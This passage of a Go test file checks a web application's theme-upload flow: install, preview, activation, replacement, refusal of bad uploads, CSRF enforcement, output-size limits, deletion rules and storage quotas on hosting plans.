	return e.do("POST", "/admin/appearance/themes/upload", &buf, mw.FormDataContentType(), e.cookie)
}

// themeLimits is the plan of a site of a network, for themes.
type themeLimits struct {
	SiteLimits // nil: the themes pages use no other method
	policy     ThemePolicy
	quotaErr   error
	reserved   int64
}

func (l *themeLimits) ThemePolicy(context.Context) (ThemePolicy, error) { return l.policy, nil }
func (l *themeLimits) Reserve(_ context.Context, n int64) error {
	if l.quotaErr != nil {
		return l.quotaErr
	}
	l.reserved += n
	return nil
}
func (l *themeLimits) Release(_ context.Context, n int64) { l.reserved -= n }

// TestThemeUploadFlow: upload, preview, activate, replace, a refused
// replacement that leaves the active version, delete.
func TestThemeUploadFlow(t *testing.T) {
	e := newPluginEnv(t)
	e.english()
	var logs bytes.Buffer
	e.s.log = slog.New(slog.NewTextHandler(&logs, nil))
	dir := e.s.cfg.ThemesDir
	anon := func(target string) string {
		t.Helper()
		rec := e.do("GET", target, nil, "")
		if rec.Code != http.StatusOK {
			t.Fatalf("GET %s: %d", target, rec.Code)
		}
		return rec.Body.String()
	}
	page := func() string {
		t.Helper()
		rec := e.do("GET", "/admin/appearance/themes", nil, "", e.cookie)
		if rec.Code != http.StatusOK {
			t.Fatalf("themes page: %d", rec.Code)
		}
		return rec.Body.String()
	}
	if p := page(); !strings.Contains(p, `action="/admin/appearance/themes/upload"`) || !strings.Contains(p, `name="theme"`) {
		t.Fatal("no upload form on a single-site install")
	}
	activeBefore := e.s.settings().ActiveTheme

	// Upload: installed, not active.
	rec := e.uploadTheme("tiny.zip", zipOf(t, "tiny", tinyTheme("tiny-one"), nil))
	if rec.Code != http.StatusSeeOther || rec.Header().Get("Location") != "/admin/appearance/themes#theme-tiny" {
		t.Fatalf("upload: %d %s %s", rec.Code, rec.Header().Get("Location"), rec.Body)
	}
	if e.audited("theme.uploaded") != 1 || e.s.settings().ActiveTheme != activeBefore {
		t.Fatal("not audited, or activated")
	}
	if strings.Contains(anon("/"), "tiny-one") {
		t.Fatal("the upload shows before it is activated")
	}
	if p := page(); !strings.Contains(p, `id="theme-tiny"`) || !strings.Contains(p, "/admin/appearance/themes/tiny/delete") {
		t.Fatal("the uploaded theme is not listed with its delete button")
	}
	// Preview, as the admin.
	rec = e.do("GET", "/?preview_theme=tiny", nil, "", e.cookie)
	if b := rec.Body.String(); rec.Code != http.StatusOK || !strings.Contains(b, "tiny-one") || !strings.Contains(b, theme.CreditMarker) {
		t.Fatalf("preview: %d", rec.Code)
	}
	// The admin bar's form, with the CSRF token, first ends any form a
	// theme left open.
	if b := rec.Body.String(); !strings.Contains(b, `</select></form><form method="post" action="/logout"><input type="hidden" name="csrf"`) {
		t.Fatal("the admin bar does not end an open form before its own")
	}
	// Activate.
	if rec := e.admin("/admin/appearance/themes/tiny/activate", url.Values{}); rec.Code != http.StatusSeeOther {
		t.Fatalf("activate: %d", rec.Code)
	}
	if b := anon("/"); !strings.Contains(b, "tiny-one") || !strings.Contains(b, "/themes/tiny/static/theme.css") {
		t.Fatal("the active upload does not render")
	}
	if rec := e.do("GET", "/themes/tiny/static/theme.css", nil, ""); rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), ".footer-meta") {
		t.Fatalf("static: %d", rec.Code)
	}
	if rec := e.do("GET", "/themes/tiny/static/../.sap13ns-upload.json", nil, ""); rec.Code == http.StatusOK {
		t.Fatal("the upload marker is served")
	}

	// Replace: the new version shows at once.
	two := tinyTheme("tiny-two")
	two["theme.json"] = strings.Replace(two["theme.json"], `"1.0.0"`, `"2.0.0"`, 1)
	if rec := e.uploadTheme("tiny-2.zip", zipOf(t, "tiny", two, nil)); rec.Code != http.StatusSeeOther {
		t.Fatalf("replace: %d %s", rec.Code, rec.Body)
	}
	if e.audited("theme.updated") != 1 || !strings.Contains(anon("/"), "tiny-two") {
		t.Fatal("the replacement is not live")
	}

	// A bad replacement (without the credit) is refused, listed, audited;
	// the active version stays.
	bad := zipOf(t, "tiny", tinyTheme("tiny-bad"), layoutWith(footer, ""))
	rec = e.uploadTheme("tiny-3.zip", bad)
	if rec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("refused: %d", rec.Code)
	}
	b := rec.Body.String()
	for _, want := range []string{"The theme was not installed", "The checks found problems in tiny.", "templates/layout.html", "footer credit", "data-severity=\"critical\""} {
		if !strings.Contains(b, want) {
			t.Errorf("the refusal does not show %q", want)
		}
	}
	if e.audited("theme.refused") != 1 || !strings.Contains(anon("/"), "tiny-two") {
		t.Fatal("a refused version replaced the active one")
	}
	ents, _ := os.ReadDir(dir)
	if len(ents) != 1 || ents[0].Name() != "tiny" {
		t.Fatalf("left in the themes directory: %v", ents)
	}

	// Not an archive, not a .zip, no file.
	if rec := e.uploadTheme("tiny.zip", []byte("not a zip")); rec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("garbage: %d", rec.Code)
	}
	if rec := e.uploadTheme("tiny.tar", []byte("x")); rec.Code != http.StatusSeeOther {
		t.Fatalf("not a zip: %d", rec.Code)
	}
	// Without the CSRF token.
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	fw, _ := mw.CreateFormFile("theme", "x.zip")
	fw.Write(zipOf(t, "csrf", tinyTheme("csrf"), nil))
	mw.Close()
	if rec := e.do("POST", "/admin/appearance/themes/upload", &buf, mw.FormDataContentType(), e.cookie); rec.Code != http.StatusForbidden {
		t.Fatalf("without CSRF: %d", rec.Code)
	}
	if _, err := os.Stat(filepath.Join(dir, "csrf")); err == nil {
		t.Fatal("installed without the CSRF token")
	}

	// Delete: never the active theme, never a built-in one.
	e.admin("/admin/appearance/themes/tiny/delete", url.Values{})
	if _, err := os.Stat(filepath.Join(dir, "tiny")); err != nil || e.audited("theme.deleted") != 0 {
		t.Fatal("the active theme was deleted")
	}
	if rec := e.admin("/admin/appearance/themes/apple/delete", url.Values{}); rec.Code != http.StatusNotFound {
		t.Fatalf("delete a built-in: %d", rec.Code)
	}
	e.admin("/admin/appearance/themes/apple/activate", url.Values{})
	if rec := e.admin("/admin/appearance/themes/tiny/delete", url.Values{}); rec.Code != http.StatusSeeOther {
		t.Fatalf("delete: %d", rec.Code)
	}
	if _, err := os.Stat(filepath.Join(dir, "tiny")); !errors.Is(err, os.ErrNotExist) || e.audited("theme.deleted") != 1 {
		t.Fatal("not deleted")
	}
	if strings.Contains(page(), `id="theme-tiny"`) {
		t.Fatal("still listed")
	}

	// A theme that passes the checks but writes more than the output
	// limit: a 500 and a log line, not the page. (Without page data, as
	// the checks' probe runs it, it writes nothing: a page that is too big
	// without data is refused at upload.)
	huge := tinyTheme("huge")
	huge["templates/partials/big.html"] = `{{define "huge/big"}}` + strings.Repeat("0123456789abcdef", 200<<10/16) + `{{end}}`
	huge["templates/home.html"] = `{{define "content"}}{{if .Site}}` + strings.Repeat(`{{template "huge/big"}}`, 50) + `{{end}}{{end}}`
	tooBig := tinyTheme("too-big")
	tooBig["templates/partials/big.html"] = huge["templates/partials/big.html"]
	tooBig["templates/home.html"] = `{{define "content"}}` + strings.Repeat(`{{template "huge/big"}}`, 50) + `{{end}}`
	if rec := e.uploadTheme("too-big.zip", zipOf(t, "too-big", tooBig, nil)); rec.Code != http.StatusUnprocessableEntity ||
		!strings.Contains(rec.Body.String(), "goes over the limits of uploaded themes") {
		t.Fatalf("too big without data: %d", rec.Code)
	}
	if rec := e.uploadTheme("huge.zip", zipOf(t, "huge", huge, nil)); rec.Code != http.StatusSeeOther {
		t.Fatalf("huge: %d %s", rec.Code, rec.Body)
	}
	logs.Reset()
	if rec := e.do("GET", "/?preview_theme=huge", nil, "", e.cookie); rec.Code != http.StatusInternalServerError || strings.Contains(rec.Body.String(), "0123456789abcdef") {
		t.Fatalf("over the output cap: %d, %d bytes", rec.Code, rec.Body.Len())
	}
	if l := logs.String(); !strings.Contains(l, "uploaded theme refused to render") || !strings.Contains(l, "theme=huge") {
		t.Fatalf("no log line: %s", l)
	}
	// The built-in theme renders as before.
	if !strings.Contains(anon("/"), theme.CreditMarker) {
		t.Fatal("the built-in theme broke")
	}

	// An uploaded theme whose slug a built-in (or, later, a network) theme
	// takes: the page reloads the directory, lists it as not loaded, and
	// deletes it; the built-in theme stays.
	shadow := tinyTheme("shadow")
	shadow[".sap13ns-upload.json"] = `{"sha256": "x", "source": "upload"}`
	for name, content := range shadow {
		p := filepath.Join(dir, "bento", filepath.FromSlash(name))
		os.MkdirAll(filepath.Dir(p), 0o750)
		if err := os.WriteFile(p, []byte(content), 0o640); err != nil {
			t.Fatal(err)
		}
	}
	if p := page(); !strings.Contains(p, `id="failed"`) || !strings.Contains(p, "/admin/appearance/themes/bento/delete") {
		t.Fatal("the shadowed folder is not listed")
	}
	if rec := e.admin("/admin/appearance/themes/bento/delete", url.Values{}); rec.Code != http.StatusSeeOther {
		t.Fatalf("delete the shadowed folder: %d", rec.Code)
	}
	if _, err := os.Stat(filepath.Join(dir, "bento")); !errors.Is(err, os.ErrNotExist) {
		t.Fatal("the shadowed folder stayed")
	}
	if th, ok := e.s.themes.Get("bento"); !ok || !th.Builtin {
		t.Fatal("the built-in theme went")
	}
}

// TestThemeUploadPlan: on a site of a network the plan decides, and the
// files count against its storage.
func TestThemeUploadPlan(t *testing.T) {
	e := newPluginEnv(t)
	e.english()
	lim := &themeLimits{policy: ThemePolicy{Plan: "Personal"}}
	e.s.limits = lim
	dir := e.s.cfg.ThemesDir
	pkg := zipOf(t, "tiny", tinyTheme("tiny"), nil)

	b := e.do("GET", "/admin/appearance/themes", nil, "", e.cookie).Body.String()
	if strings.Contains(b, `action="/admin/appearance/themes/upload"`) || !strings.Contains(b, "On the Personal plan") ||
		strings.Contains(b, "copy its folder into the themes directory") {
		t.Fatal("the Personal plan shows the upload form")
	}
	if rec := e.uploadTheme("tiny.zip", pkg); rec.Code != http.StatusForbidden {
		t.Fatalf("Personal: %d", rec.Code)
	}
	if ents, _ := os.ReadDir(dir); len(ents) != 0 {
		t.Fatalf("installed on Personal: %v", ents)
	}

	lim.policy = ThemePolicy{Plan: "Pro", Uploads: true}
	lim.quotaErr = media.ErrQuota
	if rec := e.uploadTheme("tiny.zip", pkg); rec.Code != http.StatusRequestEntityTooLarge {
		t.Fatalf("over the quota: %d", rec.Code)
	}
	if ents, _ := os.ReadDir(dir); len(ents) != 0 {
		t.Fatalf("left over the quota: %v", ents)
	}

	lim.quotaErr = nil
	if rec := e.uploadTheme("tiny.zip", pkg); rec.Code != http.StatusSeeOther {
		t.Fatalf("Pro: %d %s", rec.Code, rec.Body)
	}
	if lim.reserved <= 0 {
		t.Fatal("no storage counted")
	}
	// The same version again: the growth only.
	before := lim.reserved
	if rec := e.uploadTheme("tiny.zip", pkg); rec.Code != http.StatusSeeOther || lim.reserved != before {
		t.Fatalf("replace: %d, %d → %d", rec.Code, before, lim.reserved)
	}
	// A downgrade stops uploads; the theme stays and can be deleted, which
	// gives the bytes back.
	lim.policy = ThemePolicy{Plan: "Personal"}
	if rec := e.uploadTheme("tiny.zip", pkg); rec.Code != http.StatusForbidden {
		t.Fatalf("after a downgrade: %d", rec.Code)
	}
	if !strings.Contains(e.do("GET", "/admin/appearance/themes", nil, "", e.cookie).Body.String(), `id="theme-tiny"`) {
		t.Fatal("the downgrade removed the theme")
	}
	if rec := e.admin("/admin/appearance/themes/tiny/delete", url.Values{}); rec.Code != http.StatusSeeOther || lim.reserved != 0 {
		t.Fatalf("delete: %d, %d bytes still counted", rec.Code, lim.reserved)
	}
}
